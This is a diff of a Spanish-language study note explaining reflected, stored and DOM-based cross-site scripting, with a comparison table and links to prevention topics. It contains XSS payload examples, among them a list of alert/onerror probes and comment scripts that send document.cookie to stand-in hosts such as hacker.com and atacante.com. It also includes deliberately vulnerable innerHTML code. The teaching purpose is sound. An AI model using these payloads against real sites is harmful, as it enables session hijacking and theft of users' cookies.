@@ -26,138 +26,92 @@ Payload:
 * El mismo principio permite realizar otros tipos de ataques contra usuarios de la aplicación.
 
 
-
-
-
-
-
-
-```js
-<script>alert(window.origin)</script>
-<img src="" onerror=alert(window.origin)>
-javascript:alert(document.cookie)
-<iframe src="https://0a7a000803b4b69f80ea0d7e00d3004e.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
-"onmouseover="alert(1)
-javascript:alert(1)
-'-alert(1)-'
-```
-
-
 ---
 
-# Cross-Site Scripting (XSS)
+# XSS (Cross-Site Scripting)
 
-> [!SUMMARY] Definición
-> El **Cross-Site Scripting (XSS)** es una vulnerabilidad que permite a un atacante inyectar scripts maliciosos (generalmente JavaScript) en páginas web vistas por otros usuarios.
+> [!SUMMARY] Resumen
 > 
-> **Diferencia clave:** A diferencia de una inyección SQL (que ataca la base de datos), el XSS ataca al **usuario** que visita la web.
+> Vulnerabilidad que permite inyectar scripts maliciosos en webs vistas por otros usuarios.
+> 
+> Objetivo: Ejecutar código en el navegador de la víctima (robo de cookies, sesiones, redirecciones).
 
 ---
 
 ## 1. XSS Reflejado (Reflected)
-El script malicioso viaja en la solicitud (URL) y el servidor lo "refleja" de vuelta en la respuesta. Es temporal y requiere ingeniería social.
 
-> [!EXAMPLE] Vector de Ataque
-> El atacante envía un enlace malicioso a la víctima (Phishing).
-> `http://sitio.com/buscar?q=<script>alert('XSS')</script>`
+El script malicioso **no se guarda** en el servidor; viaja en la URL y el servidor lo "refleja" en la respuesta.
 
-**Flujo del ataque:**
+- **Vector:** Enlaces maliciosos (Phishing).
+- **Persistencia:** Nula (requiere que la víctima haga clic cada vez).
 
-```mermaid
-sequenceDiagram
-    participant Atacante
-    participant Victima
-    participant Servidor
+> [!EXAMPLE] Ejemplo de URL
+> http://sitio.com/buscar?q=<script>alert('XSS')</script>
+
+**Cómo funciona:**
+
+1. La víctima hace clic en el link.
+2. El servidor recibe la `q` y la pone en el HTML de respuesta: `Resultados para: <script>...</script>`.
+3. El navegador ejecuta el script.
+
+---
+
+## 2. XSS Almacenado (Stored)
+
+El script malicioso **se guarda** permanentemente en el servidor (Base de datos, foros, comentarios).
+
+- **Vector:** Formularios de comentarios, perfiles de usuario, posts.
+- **Persistencia:** Alta (afecta a cualquiera que visite la página).
+
+> [!FAIL] Código Vulnerable (Ejemplo)
+> Un atacante comenta en un blog:
+> ```HTML
+> Excelente post!
+> <script>
+>   // Envía las cookies de quien lea esto al atacante
+>   new Image().src = "http://hacker.com/robo.php?c=" + document.cookie;
+> </script>
+> ```
+
+**Cómo funciona:**
+
+1. El servidor guarda el comentario.
+2. Cuando otros usuarios (o el administrador) cargan el post, el servidor sirve el comentario con el script.
+3. El script se ejecuta automáticamente sin que el usuario haga nada extraño.
     
-    Atacante->>Victima: Envía enlace malicioso (Email/Chat)
-    Victima->>Servidor: Clic en enlace (Request + Script)
-    Servidor-->>Victima: Responde con la web + Script reflejado
-    Note right of Victima: El navegador ejecuta el script
-
-
-## 2. XSS Almacenado (Stored / Persistent)
-
-Es el más peligroso. El script se guarda permanentemente en el servidor (Base de Datos, Logs, Comentarios).
-
-> [!DANGER] Impacto
-> 
-> No requiere que la víctima haga clic en un enlace especial. Simplemente visitar la página infectada ejecuta el código. Afecta a todos los visitantes.
-
-Ejemplo de inyección:
-
-En un foro o sección de comentarios:
-
-HTML
-
-```
-Hola a todos!
-<script>
-  fetch('[http://atacante.com/robador?cookie=](http://atacante.com/robador?cookie=)' + document.cookie);
-</script>
-```
-
-**Flujo del ataque:**
-
-Fragmento de código
-
-```
-graph LR
-    A[Atacante] -->|POST: Comentario + Script| B[(Base de Datos)]
-    B -->|Carga contenido| C[Servidor Web]
-    C -->|Sirve página infectada| D[Víctima 1]
-    C -->|Sirve página infectada| E[Víctima 2]
-    C -->|Sirve página infectada| F[Admin]
-```
 
 ---
 
 ## 3. XSS basado en DOM (DOM-based)
 
-La vulnerabilidad ocurre completamente en el **cliente (navegador)**. El servidor puede enviar una página segura, pero el JavaScript del cliente manipula los datos de forma insegura.
+Ocurre enteramente en el **navegador**. El servidor envía la página bien, pero el Javascript del sitio manipula los datos de forma insegura.
 
-- **Source (Fuente):** De dónde vienen los datos (ej: `location.hash`, `location.search`).
-    
-- **Sink (Sumidero):** Dónde se ejecutan (ej: `innerHTML`, `document.write`, `eval`).
+- **Fuente (Source):** `location.hash`, `location.search`, `document.referrer`.
+- **Sumidero (Sink):** `innerHTML`, `document.write`, `eval()`.
     
 
-> [!BUG] Código Vulnerable (Ejemplo)
-> 
-> JavaScript
-> 
+> [!BUG] Ejemplo Javascript
+> ```JavaScript
+> // Toma el texto después del # en la URL y lo pega en el HTML
+> var mensaje = location.hash.substring(1);
+> document.getElementById('saludo').innerHTML = mensaje;
 > ```
-> // El script toma el hash de la URL y lo escribe en el HTML sin sanitizar
-> var userConfig = location.hash.substring(1);
-> document.getElementById("welcome-msg").innerHTML = userConfig;
-> ```
-> 
-> _Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, el código se ejecuta._
+> Si la URL es `sitio.com#<img src=x onerror=alert(1)>`, se ejecuta el ataque.
 
 ---
 
-## Tabla Comparativa
+## Diferencias Clave
 
-|**Tipo**|**Ubicación del Payload**|**Persistencia**|**Interacción requerida**|
-|---|---|---|---|
-|**Reflejado**|En la URL (Solicitud)|No (Un solo uso)|Alta (Clic en enlace)|
-|**Almacenado**|Base de Datos (Servidor)|Sí (Permanente)|Baja (Solo visitar)|
-|**DOM-based**|DOM del Navegador|Depende de la fuente|Variable|
-
----
-
-### Variantes Avanzadas
-
-> [!WARNING] Blind XSS
-> 
-> Una variante del Stored XSS donde el atacante inyecta código en un lugar que no puede ver (ej: formulario de contacto, logs de errores).
-> 
-> El payload se detona días o semanas después cuando un **Administrador** revisa esos datos en un panel interno, permitiendo el robo de sesiones privilegiadas.
+|**Tipo**|**¿Dónde se aloja el payload?**|**¿Quién ve el ataque?**|
+|---|---|---|
+|**Reflejado**|En la URL (Cliente -> Servidor -> Cliente)|Solo la víctima que hace clic|
+|**Almacenado**|Base de Datos del Servidor|Todos los visitantes|
+|**DOM-based**|En el navegador (Cliente -> Cliente)|Depende de cómo se comparta el link|
 
 ---
 
-## [[Prevención y Mitigación]]
+## Notas Relacionadas
 
-- **Sanitización de entrada:** Limpiar datos recibidos.
-    
-- **Codificación de salida (Output Encoding):** Convertir caracteres especiales en entidades HTML (ej: `<` a `&lt;`).
-    
-- **CSP ([[Content Security Policy]]):** Restringir los dominios desde donde se pueden cargar scripts.
+- [[Prevención de XSS]]
+- [[Content Security Policy (CSP)]]
+- [[Robo de Sesiones]]
